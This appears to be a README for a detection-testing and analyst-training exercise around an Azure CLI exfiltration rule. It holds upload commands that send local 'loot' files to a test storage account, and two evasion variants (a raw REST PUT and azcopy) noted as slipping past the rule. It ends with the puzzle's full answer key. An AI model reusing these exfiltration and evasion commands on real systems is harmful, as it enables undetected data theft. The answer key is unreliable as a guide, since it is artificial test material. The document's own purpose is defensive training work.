# NonApp-tdspti-BO_WF2025_4048_Exfiltration_via_Azure_CLI
This repo holds payloads for triggering the rule [WF2025.4048.Exfiltration_via_Azure_CLI]

This rule is designed to find Azure CLI exfiltration patterns (`az storage blob upload`) on Windows systems. The upstream RBA correlation emits a Notable when an entity's accumulated risk crosses 100 in 24h, so the engagement run fires the trigger twice (80 risk each = 160 total) to land a Notable on the analyst's queue.

# Operation Runbook
## 1. clone the repo and go into the directory
```
git clone git@github.com:NonApp-TDSPTI/NonApp-tdspti-BO_WF2025_4048_Exfiltration_via_Azure_CLI.git
cd NonApp-tdspti-BO_WF2025_4048_Exfiltration_via_Azure_CLI
```

## 2. generate your PAT in JIRA
- login to [jira > profile > personal access tokens]
- create a PAT with 1 day duration, copy it

## 3. update the .json
Copy the production canonical template, then edit it:

```
cd payloads\automated
copy wrapper-config.example.json wrapper-config.json
notepad wrapper-config.json
```

In the JSON:
- paste your PAT under `jira.pat`
- set `jira.issue_key` to the engagement ticket
- flip `jira.dry_run` to `false` for live JIRA POSTs
- save

## 4. execution time
one script to run, no interactive prompts. the wrapper drives all four stages itself, posts a JIRA comment per stage, and computes a cron-aware wait between the two trigger fires so each emits a separate detection.

### a. start the wrapper
```
powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\runner.ps1
```

- expected sequence
```
01 evasion-sdk-iwr-piece-1   → fixed wait (10s)
02 evasion-azcopy-piece-2    → fixed wait (10s)
03 trigger-direct-piece-3    → cron-aware wait (~25-40 min)
04 trigger-direct-piece-4    → no wait
validator                    → flag-based check (carrier + writer + partN.dat)
cleanup                      → removes part*.dat + stage-*.flag
```

The non-debug output is one line per state change. M = 6 (4 stages + validator + cleanup). Each stage prints:
```
action N/6: started
action N/6: done
action N/6: waiting 10s        ← in-place countdown
```

The cron-aware wait between stage 3 and stage 4 looks the same, just with a longer duration:
```
action 3/6: waiting 32m 18s
```

Total run ~40 min including stages. Final line is `exiting`. JIRA comments are posted automatically per stage if you inserted a PAT.

### b. cleanup
- the script will clean up after itself automatically, you're done when it's done!

### c. exit codes
| exit | meaning |
|---|---|
| 0 | all stages done; validator [PASS]; cleanup ran |
| 1 | validator [FAIL] — at least one stage's flag missing or wrong carrier; cleanup ran |
| 2 | config problem (missing/malformed wrapper-config, empty PAT, schema mismatch) |
| 3 | JIRA auth probe failed (only when `jira.dry_run=false`) |
| 5 | wrapper-config references a path that doesn't exist (stale config — refresh from `.example.json`) |
| 6 | a stage script exited non-zero (e.g. `az` not on PATH, azcopy not staged); pipeline aborts; cleanup still runs |

# The Puzzle
## Strategy
This detection only fires on the trigger variants, so the Notable's drilldown gives the analyst pieces 3 and 4. Pieces 1 and 2 are carried by evasion variants the rule misses — they're sitting in plain telemetry under the same user, same window, same destinations.

*TLDR:*
Four invocations across the engagement run write Azure blobs with carrier filenames `loot-<hex>.bin`. The two trigger fires use `az storage blob upload` and produce the Notable; the two evasion fires use Invoke-WebRequest (raw REST PUT) and `azcopy copy` against the same blob backend and never trip the rule. Each invocation also touches a `partN.dat` companion file that gives the piece its index. Hex-decode each piece, concat in `partN` order, b64-decode the result.

Verbose:
- The rule emits an Intermediate finding per detection (`risk_score=80`, `risk_object=src_user_normalized`).
- Two trigger fires 30+ minutes apart emit separate detections (back-to-back fires would aggregate under `groupBy(src_user)`); the wrapper's cron-aware wait enforces the gap.
- Two detections sum to 160 risk on the user → upstream RBA correlation crosses 100 in 24h → Notable.
- The Notable groups two contributing risk events; each carries its triggering invocation in `values(CommandLine)`. Pulling `loot-<hex>.bin` from each yields pieces 3 and 4.
- The decode chain expects 4 pieces. The gap is the cue. Forensic pivot to `ProcessRollup2` for the same `src_user` in the same window, filter `CommandLine` for `loot-[0-9a-f]+\.bin`, and the IWR + azcopy invocations show up alongside the trigger detections — pieces 1 and 2 right there, on the same host, under the same user, in the same window.

The teaching: the alert was the starting point, not the finish line. Half the activity that rebuilds the puzzle sat in plain telemetry under the same entity — visible to anyone who pivoted past the rule's keyword guard.

## Payload choice & CLI example
We run all four variants per engagement (no interchange — the puzzle distribution depends on all four landing). The trigger pair fires the rule; the evasion pair carries the missing puzzle pieces.

What the analyst sees in the Notable's risk events (pieces 3, 4):
```
# trigger 1 (detection A)
az storage blob upload --account-name bopsaztestacct01 --container-name exfil --file "C:\Users\Public\exfil\part3.dat" --name "loot-3576633342.bin"

# trigger 2 (detection B, ~30+ min later)
az storage blob upload --account-name bopsaztestacct01 --container-name exfil --file "C:\Users\Public\exfil\part4.dat" --name "loot-766232343d.bin"
```

What the analyst finds via forensic pivot to raw `ProcessRollup2` (pieces 1, 2):
```
# evasion 1 — IWR PUT (rule misses; visible only in raw ProcessRollup2)
powershell -Command Invoke-WebRequest -Uri 'https://bopsaztestacct01.blob.core.windows.net/exfil/loot-6447686c63.bin?sv=...' -Method PUT -InFile 'C:\Users\Public\exfil\part1.dat' ...

# evasion 2 — azcopy copy (rule misses; visible only in raw ProcessRollup2)
azcopy copy "C:\Users\Public\exfil\part2.dat" "https://bopsaztestacct01.blob.core.windows.net/exfil/loot-6d56706332.bin?sv=..." --output-level=quiet
```

## Technical Solution
1. extract each `loot-<hex>.bin` carrier:
```
piece 1 (evasion: IWR)         = 6447686c63    (from forensic pivot — not in alert)
piece 2 (evasion: azcopy)      = 6d56706332    (from forensic pivot — not in alert)
piece 3 (trigger: az direct A) = 3576633342    (from Notable drilldown)
piece 4 (trigger: az direct B) = 766232343d    (from Notable drilldown)
```

2. order by `partN.dat` (in `--file` for triggers, `-InFile` for IWR, source path for azcopy), then hex-decode each piece:
```
6447686c63 = dGhlc
6d56706332 = mVpc2
3576633342 = 5vc3B
766232343d = vb24=
```

3. concat in `partN` order (1 → 4):
```
dGhlc + mVpc2 + 5vc3B + vb24=  =  dGhlcmVpc25vc3Bvb24=
```

4. base64-decode the result:
```
dGhlcmVpc25vc3Bvb24= = thereisnospoon
```

5. bend the spoon

6. ???

7. profit
